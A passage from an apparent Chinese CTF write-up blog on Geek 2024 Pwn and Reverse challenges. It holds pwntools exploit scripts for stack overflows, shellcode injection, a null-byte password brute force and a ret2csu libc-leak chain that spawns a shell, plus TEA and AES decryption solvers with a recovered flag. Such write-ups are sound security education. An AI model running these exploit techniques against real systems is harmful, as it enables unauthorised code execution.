class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>filename=<span class="hljs-string">&#x27;./stackover&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">19265</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><br>key=<span class="hljs-number">0x40072C</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">20</span>+p64(key)<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&quot;Welcome to geek,what&#x27;s you name?&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>shellcode长度足够，直接用系统生成的，之后溢出返回到gift修改bss段权限\</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731736711047-00c8c067-593e-4413-b83c-3c9bc159024d.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>filename=<span class="hljs-string">&#x27;./shellcode&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">32143</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><br>gift=<span class="hljs-number">0x401256</span><br><br>shellcode=asm(shellcraft.sh())<br>shellcode=shellcode.ljust(<span class="hljs-number">0x18f</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>sla(<span class="hljs-string">&quot;do you know shellcode?&quot;</span>,shellcode)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(gift)<br>sla(<span class="hljs-string">&quot;please input your name:&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="000000"><a href="#000000" class="headerlink" title="000000"></a>000000</h2><p>urandom生成随机密码，利用strcmp匹配到’\00’结束爆破密码</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731738555131-cd425a4f-2cb7-4b25-9130-01079af2eb48.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename=<span class="hljs-string">&#x27;./main&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">42198</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br> <span class="hljs-keyword">try</span>:<br>    io = remote(<span class="hljs-string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="hljs-number">34516</span>)<br>    sla(<span class="hljs-string">&quot;Enter the password: &quot;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    response1 = io.recvline()<br>    response = io.recvline()<br>    <span class="hljs-comment">#print(response)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;SYC&#x27;</span> <span class="hljs-keyword">in</span> response:<br>          <span class="hljs-built_in">print</span>(response)<br>          inter()<br>          <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>          io.close()<br> <span class="hljs-keyword">except</span> EOFError:<br>    io.close()<br>    <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><h2 id="su"><a href="#su" class="headerlink" title="su"></a>su</h2><p>文件名已经提示csu</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731916667334-ca548886-3f3f-482e-a656-4428bca57b20.png" class="" title="img"><p>直接套模板打，最后失败的时候加个ret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>filename=<span class="hljs-string">&#x27;./csu&#x27;</span><br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">27363</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x400903</span><br>ret=<span class="hljs-number">0x4005d6</span><br>csu_front_addr=<span class="hljs-number">0x4008E0</span><br>csu_end_addr=<span class="hljs-number">0x4008FA</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    <span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx should be 0,</span><br>    <span class="hljs-comment"># rbp should be 1,enable not to jump</span><br>    <span class="hljs-comment"># r12 should be the function we want to call</span><br>    <span class="hljs-comment"># rdi=edi=r13d</span><br>    <span class="hljs-comment"># rsi=r14</span><br>    <span class="hljs-comment"># rdx=r15</span><br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span><br>    payload += p64(csu_end_addr) <br>    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    <span class="hljs-comment">#debug()</span><br>    s(payload)<br><br>sla(<span class="hljs-string">&quot;[3] exit.&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got,<span class="hljs-number">1</span>,write_got, <span class="hljs-number">0x8</span>, main_addr)<br>write_addr=get_addr()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write:&quot;</span>,<span class="hljs-built_in">hex</span>(write_addr))<br>libc_base=write_addr-libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>bin_addr=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))+libc_base<br>sla(<span class="hljs-string">&quot;[3] exit.&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(ret)+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_addr)<br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ezzzz"><a href="#ezzzz" class="headerlink" title="ezzzz"></a>ezzzz</h2><p>三个注意点，一个是一开始的delta，第二个是v0和v1是int，最后异或(sum+i)，那么for要从i&#x3D;31逆着来</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731857724576-3ca1a863-8cf9-4ca5-bac0-53045be9b033.png" class="" title="img"><p>不熟悉的话尝试写正向加密比较数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">int32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">1640531527</span>;<br><span class="hljs-type">uint32_t</span> sum = (<span class="hljs-number">-32</span>)*delta;<br><span class="hljs-comment">//int32_t sum=0;</span><br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">31</span>; i &gt;=<span class="hljs-number">0</span>; i--) &#123;<br>    <span class="hljs-comment">//printf(&quot;%d,%d,%d\n&quot;,v0,v1,sum);</span><br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])^(sum+i);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>])^(sum+i);<br><span class="hljs-comment">//        v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3])^(sum+i);</span><br><span class="hljs-comment">//        sum -= delta;</span><br><span class="hljs-comment">//        v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3])^(sum+i);</span><br><span class="hljs-comment">//printf(&quot;%d,%d,%d\n&quot;,v0,v1,sum);</span><br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;K&#x27;</span>&#125;;<br>    <span class="hljs-type">int32_t</span> enc[] = &#123;<span class="hljs-number">0xf1f186b2</span>,<span class="hljs-number">0x5a96c782</span>,<span class="hljs-number">0xe6c63a0b</span>,<span class="hljs-number">0x70b61b5c</span>,<span class="hljs-number">0xed6bf848</span>,<span class="hljs-number">0x89700d6b</span>,<span class="hljs-number">0x09381b5c</span>,<span class="hljs-number">0xcb2f24fa</span>,<span class="hljs-number">0xb1c79e79</span>,<span class="hljs-number">0x6d822d9c</span>,<span class="hljs-number">0xdcc55f76</span>,<span class="hljs-number">0x0f780e75</span>,<span class="hljs-number">0x0d65c4af</span>,<span class="hljs-number">0xb89084a9</span>,<span class="hljs-number">0xe978c382</span>,<span class="hljs-number">0x7a8dd810</span>,<span class="hljs-number">0x91f28df3</span>,<span class="hljs-number">0xa84dbaca</span>,<span class="hljs-number">0xb4d75f75</span>,<span class="hljs-number">0xf19af8e5</span>,<span class="hljs-number">0xb90f80fc</span>,<span class="hljs-number">0xfc10a5c3</span>,<span class="hljs-number">0xd20679fb</span>,<span class="hljs-number">0x2bc734c8</span>,<span class="hljs-number">0xccb31c92</span>,<span class="hljs-number">0x1ac52ad3</span>,<span class="hljs-number">0xe7f922b7</span>,<span class="hljs-number">0x2e24d923</span>,<span class="hljs-number">0xfb4ce9f5</span>,<span class="hljs-number">0x3548a9e5</span>,<span class="hljs-number">0x71ebc25a</span>,<span class="hljs-number">0xdf38862e</span>,<span class="hljs-number">0x10059186</span>,<span class="hljs-number">0x32750946</span>,<span class="hljs-number">0x3dd4d54c</span>,<span class="hljs-number">0x905abc36</span>,<span class="hljs-number">0xc26d5312</span>,<span class="hljs-number">0xd2cd42c0</span>,<span class="hljs-number">0x772d99e5</span>,<span class="hljs-number">0x0cd4c466</span>,<span class="hljs-number">0x5c3178d6</span>,<span class="hljs-number">0x3a7ffe71</span>,<span class="hljs-number">0xada251c0</span>,<span class="hljs-number">0x70568d5a</span>,<span class="hljs-number">0x5798c292</span>,<span class="hljs-number">0x1ec0f7fc</span>,<span class="hljs-number">0x3ae9d841</span>,<span class="hljs-number">0x84607629</span>,<span class="hljs-number">0x30ca6a2d</span>,<span class="hljs-number">0xccef51d2</span>,<span class="hljs-number">0xa1a80854</span>,<span class="hljs-number">0x91b0f82d</span>,<span class="hljs-number">0x686ca347</span>,<span class="hljs-number">0x74c52d0f</span>,<span class="hljs-number">0x0f26449f</span>,<span class="hljs-number">0xc28d362c</span>,<span class="hljs-number">0x86f3311b</span>,<span class="hljs-number">0x8adc4fb1</span>,<span class="hljs-number">0xa4497e34</span>,<span class="hljs-number">0xe0f0915d</span>&#125;;<br>    <span class="hljs-comment">//printf(&quot;%d&quot;,strlen(enc));</span><br><span class="hljs-comment">//int32_t enc[] = &#123;&#x27;S&#x27;,&#x27;Y&#x27;&#125;;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">60</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">60</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i]&amp;<span class="hljs-number">0x7f</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//SYC&#123;g0od_j0b_wweLCoMeToooSSSyC_zz_1_et3start_yoUr_j0urney!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h2><p>去除花指令后发现是aes</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731910932918-8bad1bd8-176b-4d19-a0c9-0b96934f76b8.png" class="" title="img"><p>key和iv可以调试获得，这里的key不是phKey也不是phKey作为地址对应的内容，而是上面pbSecret的值</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731904125101-dd08553b-64ef-4ff7-8cdb-807437ae53f2.png" class="" title="img"><p>标准的aes</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731910866145-1397182b-26b2-4528-8aba-b09d9dc4633b.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> struct<br><br>pbSecret = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xAD</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xCA</span>,<br>                  <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xDA</span>])<br><br>initial_iv = struct.pack(<span class="hljs-string">&#x27;&lt;4I&#x27;</span>, <span class="hljs-number">0x941E70C1</span>, <span class="hljs-number">0x013142F4</span>, <span class="hljs-number">0x550A3FB0</span>, <span class="hljs-number">0xD399FFA1</span>)<br>v10 = struct.pack(<span class="hljs-string">&#x27;&lt;2Q&#x27;</span>, <span class="hljs-number">0xFEF76ECE6FA34BA2</span>, <span class="hljs-number">0x67735D6CF76837EC</span>)<br><br><br>final_iv = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(initial_iv, v10))<br><br>v9 = [<br>    <span class="hljs-number">0x754CE0DD</span>, <span class="hljs-number">0xB8143397</span>, <span class="hljs-number">0x1119B617</span>, <span class="hljs-number">0x23608A61</span>,<br>    <span class="hljs-number">0x1AE21646</span>, <span class="hljs-number">0x265BC365</span>, <span class="hljs-number">0x30ADF568</span>, <span class="hljs-number">0xC64BEEB1</span>,<br>    <span class="hljs-number">0xBB9EB5AB</span>, <span class="hljs-number">0xC24A9573</span>, <span class="hljs-number">0xA9CBEF78</span>, <span class="hljs-number">0xA0E171BE</span><br>]<br>ciphertext = <span class="hljs-string">b&#x27;&#x27;</span>.join(struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> v9)<br><br><br>cipher = AES.new(pbSecret, AES.MODE_CBC, final_iv)<br>decrypted = 